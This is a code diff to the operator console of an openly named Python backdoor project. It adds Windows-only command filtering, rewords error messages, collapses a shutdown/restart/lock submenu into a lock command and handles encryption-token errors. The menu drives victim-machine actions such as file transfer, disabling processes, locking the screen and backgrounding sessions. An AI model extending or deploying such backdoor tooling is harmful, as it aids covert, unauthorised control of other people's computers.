@@ -8,20 +8,30 @@ license: https://github.com/xp4xbox/Python-Backdoor/blob/master/license
 
 import socket
 
-import src.command_defs as c
-from src.command_defs import *
+import cryptography
+
+import src.definitions.commands as c
+from src.definitions import platforms
+from src.definitions.commands import *
 
 
-def menu_help(_list):
+def menu_help(_list, _platform=platforms.UNKNOWN):
     out = ""
 
     for i in range(0, len(_list)):
+
+        if "platform" in _list[i] and _list[i]["platform"] == "windows" and _platform != platforms.WINDOWS:
+            continue
+
         out += f"{_list[i]['arg']} {_list[i]['info']}"
 
         if "arg2" in _list[i]:
             out += f" <{_list[i]['arg2']}>"
 
         if "optional_arg2" in _list[i]:
+            out += f" [{_list[i]['optional_arg2']}]"
+
+        if "optional_arg3" in _list[i]:
             out += f" [{_list[i]['optional_arg3']}]"
 
         if i != len(_list) - 1:
@@ -51,14 +61,18 @@ class View:
         self.control = control
         self.main_menu()
 
-    def check_input(self, _input, _list):
+    def check_input(self, _input, _list, _platform=platforms.UNKNOWN):
         for arg in _list:
             if _input[0] == arg["arg"]:
                 if "arg2" in arg and len(_input) < 2:
                     self.control.logger.error(f"Missing argument: {arg['arg2']}")
                     return False
+                elif "platform" in arg and arg["platform"] == "windows" and _platform != platforms.WINDOWS:
+                    self.control.logger.error(f"Command '{_input[0]}' is only supported with windows clients")
+                    return False
+
                 return True
-        self.control.logger.error(f"Command not found, type {MENU_HELP} for Help")
+        self.control.logger.error(f"Command '{_input[0]}' not found, type {MENU_HELP} for Help")
         return False
 
     def main_menu(self):
@@ -96,6 +110,8 @@ class View:
                 print()
 
     def interact_menu(self):
+        _platform = platforms.UNIX if self.control.socket.get_curr_address()['is_unix'] else platforms.WINDOWS
+
         try:
             while True:
                 choice = _input("interact>> ")
@@ -104,10 +120,10 @@ class View:
                 if choice == "":
                     continue
 
-                if self.check_input(choice, SERVER_INTERACT_COMMAND_LIST):
+                if self.check_input(choice, SERVER_INTERACT_COMMAND_LIST, _platform):
                     match choice[0]:
                         case c.MENU_HELP:
-                            menu_help(SERVER_INTERACT_COMMAND_LIST)
+                            menu_help(SERVER_INTERACT_COMMAND_LIST, _platform)
                         case c.MENU_INTERACT_SEND:
                             self.control.send_file()
                         case c.MENU_INTERACT_RECV:
@@ -139,17 +155,8 @@ class View:
                         case c.MENU_INTERACT_DISABLE_PROCESS:
                             self.control.toggle_disable_process(choice[1], True if len(choice) > 2 and choice[
                                 2] == MENU_INTERACT_DISABLE_PROCESS_POPUP else False)
-                        case c.MENU_INTERACT_SHUT:
-                            if choice[1] == c.MENU_INTERACT_SHUT_SHUTDOWN:
-                                self.control.shutdown()
-                                break
-                            elif choice[1] == c.MENU_INTERACT_SHUT_RESTART:
-                                self.control.restart()
-                                break
-                            elif choice[1] == c.MENU_INTERACT_SHUT_LOCK:
-                                self.control.lock()
-                            else:
-                                self.control.logger.error("Invalid argument")
+                        case c.MENU_INTERACT_LOCK:
+                            self.control.lock()
                         case c.MENU_INTERACT_BACKGROUND:
                             self.control.socket.socket = None
                             break
@@ -162,3 +169,6 @@ class View:
 
         except socket.error as e:  # if there is a socket error
             self.control.logger.error(f"Connection was lost {e}")
+        except cryptography.fernet.InvalidToken:
+            self.control.logger.error(f"Connection lost (invalid crypto token)");
+
